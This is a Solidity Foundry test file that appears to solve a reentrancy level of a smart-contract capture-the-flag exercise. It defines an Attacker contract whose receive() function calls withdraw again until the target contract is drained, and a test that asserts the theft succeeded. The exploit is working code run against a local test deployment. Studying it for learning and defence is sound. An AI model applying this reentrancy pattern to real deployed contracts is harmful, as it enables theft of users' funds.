// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {Reentrance} from "../src/level10/Reentrance.sol";

contract Attacker {
    Reentrance target;

    constructor(address targetAddr) public{
        target = Reentrance(payable(targetAddr));
    }

    function attack(uint amount) public {
        target.donate{value: amount}(address(this));
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }
}

contract TestContract is Test {
    Reentrance public target;
    Attacker public attacker;

    function setUp() public {
        target = new Reentrance();
        attacker = new Attacker(address(target));
    }

    function test_withdraw_reentrance() public {
        // vm.assume(amount < type(uint).max / 2);
        uint amount = 1 ether;

        // 随机地址捐赠 x ether
        address randomAddress = vm.randomAddress();
        vm.prank(randomAddress);

        vm.deal(randomAddress, amount);
        target.donate{value: amount}(address(randomAddress));

        vm.stopPrank();

        // attacker 捐赠 x ether 并发起攻击
        vm.deal(address(attacker), amount);
        attacker.attack(amount);

        assertEq(address(target).balance, 0);
        assertEq(address(attacker).balance, 2 * amount);
    }
}
